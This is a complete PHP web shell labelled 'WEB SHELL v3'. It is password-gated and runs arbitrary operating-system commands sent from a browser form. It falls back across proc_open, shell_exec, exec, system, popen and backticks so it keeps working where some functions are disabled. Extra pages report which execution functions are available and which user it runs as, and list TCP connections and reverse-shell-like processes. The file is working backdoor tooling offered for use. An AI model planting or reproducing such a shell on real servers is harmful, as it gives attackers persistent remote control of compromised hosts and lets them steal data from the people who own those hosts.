<?php
session_start();

$pass_hash = '$2a$12$26OCBmc4N4ePlcak3A2bqehCtjDJOF01blirEJJbpiscixCcZVcAm';

if (isset($_POST['p']) && password_verify($_POST['p'], $pass_hash)) {
    $_SESSION['auth'] = true;
}
if (!isset($_SESSION['auth'])) {
    echo '<form method=post><input type=password name=p><input type=submit></form>';
    exit;
}

// SESSION DIRECTORY TRACKER
if (!isset($_SESSION['cwd'])) {
    $_SESSION['cwd'] = getcwd();
}

// Advanced function
function hex2ip($hex) {
    $hex = str_pad($hex, 8, '0', STR_PAD_LEFT);
    $parts = str_split($hex, 2);
    $parts = array_reverse($parts);
    return long2ip(hexdec(implode('', $parts)));
}

// Function untuk list file dengan detail
function list_files_with_details($dir) {
    $items = scandir($dir);
    $result = "";
    foreach ($items as $item) {
        if ($item == '.' || $item == '..') continue;
        $path = $dir . '/' . $item;
        $isDir = is_dir($path);
        $writable = is_writable($path);
        $perm = substr(sprintf('%o', fileperms($path)), -4);
        $size = $isDir ? '-' : filesize($path);
        $sizeDisplay = $isDir ? 'DIR' : ($size < 1024 ? $size . ' B' : ($size < 1048576 ? round($size/1024,1) . ' KB' : round($size/1048576,1) . ' MB'));
        $typeIcon = $isDir ? '📁' : '📄';
        $writableIcon = $writable ? '✅' : '❌';
        $result .= sprintf("%s %s %s %-10s %s\n", $typeIcon, $writableIcon, $perm, $sizeDisplay, $item);
    }
    return $result;
}

// CHECK FUNCTIONS
if (isset($_GET['check'])) {
    echo "<!DOCTYPE html><html><head><style>
        body { background:#0a0e12; font-family:monospace; padding:20px; color:#00ff9d; }
        .card { background:#1a1f2e; border-radius:12px; padding:25px; max-width:600px; margin:auto; border-left:4px solid #00ff9d; }
        h2 { color:#ffd700; margin-top:0; }
        .func { padding:8px; margin:5px 0; background:#0a0e12; border-radius:6px; }
        .yes { color:#00ff9d; font-weight:bold; }
        .no { color:#ff4444; }
        hr { border-color:#2a2f3e; }
        .badge { display:inline-block; background:#2a2f3e; padding:2px 8px; border-radius:4px; font-size:12px; }
    </style></head><body>
    <div class='card'>
        <h2>🔧 SYSTEM CHECK</h2>
        <hr>";
    
    $funcs = ['shell_exec', 'exec', 'system', 'passthru', 'proc_open', 'popen'];
    foreach ($funcs as $f) {
        $status = function_exists($f);
        echo "<div class='func'>" . str_pad($f, 12) . " : <span class='" . ($status ? "yes" : "no") . "'>" . ($status ? "✅ AVAILABLE" : "❌ DISABLED") . "</span></div>";
    }
    
    echo "<hr>
        <div class='func'><span class='badge'>🖥️ OS</span> : " . PHP_OS . "</div>
        <div class='func'><span class='badge'>👤 USER</span> : " . (function_exists('exec') ? @exec('whoami') : get_current_user()) . "</div>
        <div class='func'><span class='badge'>📂 PATH</span> : " . getenv('PATH') . "</div>
        <hr>
        <div style='text-align:center; margin-top:20px;'>
            <a href='?'>← Back to Terminal</a>
        </div>
    </div></body></html>";
    exit;
}

// CONNECTION MONITOR
if (isset($_GET['conn'])) {
    echo "<!DOCTYPE html><html><head><style>
        body { background:#0a0e12; font-family:monospace; padding:20px; color:#00ff9d; }
        .section { background:#1a1f2e; margin:15px 0; padding:20px; border-radius:12px; border-left:4px solid #00ff9d; }
        h3 { color:#ffd700; margin:0 0 15px 0; }
        .badge { display:inline-block; padding:4px 12px; border-radius:20px; font-size:11px; }
        .danger { background:#ff000044; color:#ff8888; }
        .safe { background:#00ff0044; color:#88ff88; }
        .warning { background:#ffaa0044; color:#ffcc88; }
        table { width:100%; border-collapse:collapse; }
        td, th { padding:8px; text-align:left; border-bottom:1px solid #2a2f3e; }
        th { color:#ffd700; }
        a { color:#00ff9d; text-decoration:none; }
        a:hover { text-decoration:underline; }
    </style></head><body>
    <div style='max-width:1200px; margin:auto;'>
        <h2>🔍 CONNECTION MONITOR</h2>
        <a href='?'>← Back to Terminal</a>";
    
    // TCP Connections
    echo "<div class='section'><h3>📡 TCP CONNECTIONS</h3>";
    $tcp = @file_get_contents('/proc/net/tcp');
    if ($tcp) {
        echo "<table>";
        echo "<thead><tr><th>Local</th><th>Remote</th><th>State</th><th>Risk</th></tr></thead><tbody>";
        $lines = explode("\n", $tcp);
        foreach ($lines as $line) {
            if (preg_match('/^\s*\d+:\s+([0-9A-F]{8}):([0-9A-F]{4})\s+([0-9A-F]{8}):([0-9A-F]{4})\s+([0-9A-F]{2})/', $line, $m)) {
                $local_ip = hex2ip($m[1]);
                $local_port = hexdec($m[2]);
                $remote_ip = hex2ip($m[3]);
                $remote_port = hexdec($m[4]);
                $state = hexdec($m[5]);
                $state_name = $state == 1 ? "ESTABLISHED" : ($state == 10 ? "LISTEN" : "OTHER");
                if ($state == 1 || $state == 10) {
                    $risk = ($remote_ip != '0.0.0.0' && $remote_ip != '127.0.0.1') ? "<span class='badge danger'>⚠️ EXTERNAL</span>" : "<span class='badge safe'>LOCAL</span>";
                    echo "<tr><td>$local_ip:$local_port</td><td>$remote_ip:$remote_port</td><td>$state_name</td><td>$risk</td></tr>";
                }
            }
        }
        echo "</tbody></table>";
    } else {
        echo "<span class='badge warning'>Cannot read /proc/net/tcp</span>";
    }
    echo "</div>";
    
    // Suspicious Processes
    echo "<div class='section'><h3>🐚 SUSPICIOUS PROCESSES</h3>";
    $ps = @shell_exec("ps aux 2>/dev/null | grep -E 'nc|ncat|socat|reverse|bash -i|sh -i|perl -e|python -c|php -r' | grep -v grep");
    if ($ps) {
        echo "<pre style='color:#ff8888; background:#0a0e12; padding:15px; border-radius:8px;'>" . htmlspecialchars($ps) . "</pre>";
    } else {
        echo "<span class='badge safe'>✅ No suspicious processes</span>";
    }
    echo "</div>";
    
    // Open Ports
    echo "<div class='section'><h3>🔌 OPEN PORTS</h3>";
    $ports = @shell_exec("cat /proc/net/tcp 2>/dev/null | awk '{print \$2}' | cut -d: -f2 | grep -v '0000' | while read h; do echo \$((0x\$h)); done | sort -n | uniq");
    if ($ports) {
        $portlist = implode(", ", array_unique(explode("\n", trim($ports))));
        echo "<span class='badge warning'>📢 Ports: $portlist</span>";
    } else {
        echo "<span class='badge safe'>No open ports detected</span>";
    }
    echo "</div></div></body></html>";
    exit;
}

// HANDLE CD COMMAND & PERSISTENT DIRECTORY
if (isset($_POST['c'])) {
    $cmd = $_POST['c'];
    
    // Deteksi command cd
    if (preg_match('/^\s*cd\s+(.+)$/', $cmd, $matches)) {
        $dir = trim($matches[1]);
        $newDir = (strpos($dir, '/') === 0) ? $dir : $_SESSION['cwd'] . '/' . $dir;
        if (is_dir($newDir)) {
            $_SESSION['cwd'] = realpath($newDir);
        }
    } 
    // Command ls dengan format detail
    elseif (preg_match('/^\s*ls\s*$/i', $cmd) || preg_match('/^\s*ls\s+-la\s*$/i', $cmd) || preg_match('/^\s*dir\s*$/i', $cmd)) {
        $output = '<pre style="background:#1a1f2e; color:#00ff9d; padding:15px; border-radius:12px; overflow:auto; font-family:monospace;">';
        $output .= "📁 " . $_SESSION['cwd'] . "\n";
        $output .= str_repeat("─", 60) . "\n";
        $output .= list_files_with_details($_SESSION['cwd']);
        $output .= "</pre>";
    }
    // Command normal - DENGAN FALLBACK
    else {
        $fullCmd = 'cd ' . escapeshellarg($_SESSION['cwd']) . ' 2>/dev/null && ' . $cmd;
        $out = '';
        
        // Coba berbagai metode eksekusi (dari yang paling jarang di-disable)
        if (function_exists('proc_open')) {
            $descriptorspec = [0 => ["pipe", "r"], 1 => ["pipe", "w"], 2 => ["pipe", "w"]];
            $process = @proc_open($fullCmd, $descriptorspec, $pipes, $_SESSION['cwd']);
            if (is_resource($process)) {
                $out = stream_get_contents($pipes[1]);
                @proc_close($process);
            }
        }
        
        if ($out === '' && function_exists('shell_exec')) {
            $out = @shell_exec($fullCmd . " 2>&1");
        }
        
        if ($out === '' && function_exists('exec')) {
            @exec($fullCmd . " 2>&1", $o);
            $out = implode("\n", $o);
        }
        
        if ($out === '' && function_exists('system')) {
            ob_start();
            @system($fullCmd . " 2>&1");
            $out = ob_get_clean();
        }
        
        if ($out === '' && function_exists('popen')) {
            $p = @popen($fullCmd . " 2>&1", 'r');
            if ($p) {
                $out = stream_get_contents($p);
                @pclose($p);
            }
        }
        
        if ($out === '') {
            $out = `$fullCmd 2>&1`;
        }
        
        $output = '<pre style="background:#1a1f2e; color:#00ff9d; padding:15px; border-radius:12px; overflow:auto;">' . htmlspecialchars($out ?: "(no output)") . '</pre>';
    }
}

?>
<!DOCTYPE html>
<html>
<head>
<style>
    * { box-sizing: border-box; margin:0; padding:0; }
    body { background:#0a0e12; font-family:'Courier New',monospace; padding:30px; }
    .container { max-width:1000px; margin:auto; }
    .nav { background:#1a1f2e; padding:15px 20px; border-radius:12px; margin-bottom:20px; display:flex; gap:15px; flex-wrap:wrap; }
    .nav a { color:#00ff9d; text-decoration:none; padding:8px 16px; background:#0a0e12; border-radius:8px; transition:0.2s; }
    .nav a:hover { background:#00ff9d; color:#0a0e12; }
    .terminal { background:#1a1f2e; padding:20px; border-radius:12px; }
    .input-group { display:flex; gap:10px; flex-wrap:wrap; }
    input[type=text] { flex:1; background:#0a0e12; color:#00ff9d; border:1px solid #00ff9d; padding:12px; border-radius:8px; font-family:monospace; font-size:14px; }
    input[type=text]:focus { outline:none; border-color:#ffd700; }
    input[type=submit] { background:#00ff9d; color:#0a0e12; border:none; padding:12px 24px; border-radius:8px; cursor:pointer; font-weight:bold; transition:0.2s; }
    input[type=submit]:hover { background:#ffd700; }
    h1 { color:#ffd700; margin-bottom:20px; font-size:24px; }
    .prompt { color:#00ff9d; margin-bottom:15px; font-size:13px; background:#0a0e12; padding:8px 12px; border-radius:8px; display:inline-block; }
</style>
</head>
<body>
<div class="container">
    <h1>⚡ WEB SHELL v3</h1>
    <div class="nav">
        <a href="?check=1">🔧 CHECK FUNCTIONS</a>
        <a href="?conn=1">🌐 CONNECTION MONITOR</a>
        <a href="?">🏠 TERMINAL</a>
    </div>
    <div class="terminal">
        <div class="prompt">📁 <?php echo $_SESSION['cwd']; ?> $</div>
        <form method=post class="input-group">
            <input type=text name=c placeholder="Enter command..." autofocus>
            <input type=submit value="Execute">
        </form>
        <?php 
        if (isset($output)) echo $output;
        ?>
    </div>
</div>
</body>
</html>
